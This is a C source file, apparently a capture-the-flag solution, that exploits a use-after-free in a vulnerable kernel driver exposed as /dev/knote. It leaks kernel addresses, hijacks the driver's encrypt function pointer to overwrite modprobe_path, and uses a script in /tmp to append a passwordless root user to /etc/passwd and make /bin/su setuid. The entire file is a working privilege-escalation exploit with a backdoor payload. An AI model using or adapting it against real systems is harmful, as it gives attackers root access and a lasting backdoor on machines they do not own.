#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <errno.h>

#define PAGE_SIZE 0x1000
#define logInfo(...) do{ \
    fprintf(stderr,"[*] "); \
    fprintf(stderr,__VA_ARGS__); \
    fputc('\n',stderr); \
}while(0)
#define logErr(...) do{ \
    fprintf(stderr,"[!] "); \
    fprintf(stderr,__VA_ARGS__); \
    fputc('\n',stderr); \
}while(0)
#define errExit(...) do{ \
    logErr(__VA_ARGS__); \
    fprintf(stderr,": %s\n",strerror(errno)); \
    exit(-1); \
}while(0)

struct knote {
    char *data;
    size_t len;
    void (*encrypt_func)(char *, size_t);
    void (*decrypt_func)(char *, size_t);
};

struct knote_user {
    unsigned long idx;
    char * data;
    size_t len;
};

enum knote_ioctl_cmd {
    KNOTE_CREATE = 0x1337,
    KNOTE_DELETE = 0x1338,
    KNOTE_READ = 0x1339,
    KNOTE_ENCRYPT = 0x133a,
    KNOTE_DECRYPT = 0x133b
};

#define devfile "/dev/knote"

int devfd;

void opendev(){
    devfd = open(devfile,O_RDONLY);
    if(devfd < 0)
        errExit("open "devfile);
}

int knote_create(uint64_t idx,const char* data, size_t len){
    struct knote_user req = {
        .idx = idx,
        .data = data,
        .len = len
    };
    return ioctl(devfd,KNOTE_CREATE,&req);  
}

int knote_delete(uint64_t idx){
    struct knote_user req = {
        .idx = idx,
        .data = NULL,
        .len = 0,
    };
    return ioctl(devfd,KNOTE_DELETE,&req);
}

int knote_read(uint64_t idx,char* buf2read, size_t len){
    struct knote_user req = {
        .idx = idx,
        .data = buf2read,
        .len = len
    };
    return ioctl(devfd,KNOTE_READ,&req);
}

int knote_encrypt(uint64_t idx){
    struct knote_user req = {
        .idx = idx,
        .data = NULL,
        .len = 0,
    };
    return ioctl(devfd,KNOTE_ENCRYPT,&req);
}

int knote_decrypt(uint64_t idx){
    struct knote_user req = {
        .idx = idx,
        .data = NULL,
        .len = 0
    };
    return ioctl(devfd,KNOTE_DECRYPT,&req);
}

uint64_t ko_base;
uint64_t _text ;
uint64_t modprobe_path;
int main(int argc,char** argv,char** envp){
    opendev();

    knote_create(0,NULL,0x20);

    uint64_t* data3 = calloc(1,0x20);

    knote_create(1,NULL,0);

    knote_create(2,NULL,0);

    knote_delete(0);

    knote_create(3,(const char *)data3,0x20);    
    
    knote_delete(1);

    knote_create(1,NULL,0);

    knote_read(3,(char *)data3,0x20);

    

    logInfo("knote_encrypt = 0x%lx", data3[2]);
    logInfo("knote_decrypt = 0x%lx", data3[3]);

    ko_base = data3[3] - 0x20;
    _text = ko_base - 0x1f000000;
    modprobe_path = _text+0x837bc0;

    logInfo("_text = 0x%lx", _text);

    data3[0] = modprobe_path; // rdi
    data3[1] = *(uint64_t *)"/tmp/ex"; // rsi
    data3[2] = _text + 0x532f4; // mov [rdi], rsi ; ret

    knote_delete(3);
     // note3 -> note1
    knote_create(0,NULL,0x20); // note1 -> note3
    knote_create(4,data3,0x20);
    
    knote_encrypt(1);
    
    system("echo -e \""
            "#!/bin/sh\n"
            "echo 'vjp::0:0:root:/:/bin/sh' >> /etc/passwd\n"
            "/bin/chmod u+s /bin/su\n"
            "\" > /tmp/ex");
    chmod("/tmp/ex",0777);
    system("echo -e '\x13\x37\x42\x42' > /tmp/pwn" ); //Non-ascii for /tmp/pwn
    chmod("/tmp/pwn",0777);
    system("/tmp/pwn");  // trigger call modprobe_path
    system("grep vjp /etc/passwd" );
    system("su vjp");
}
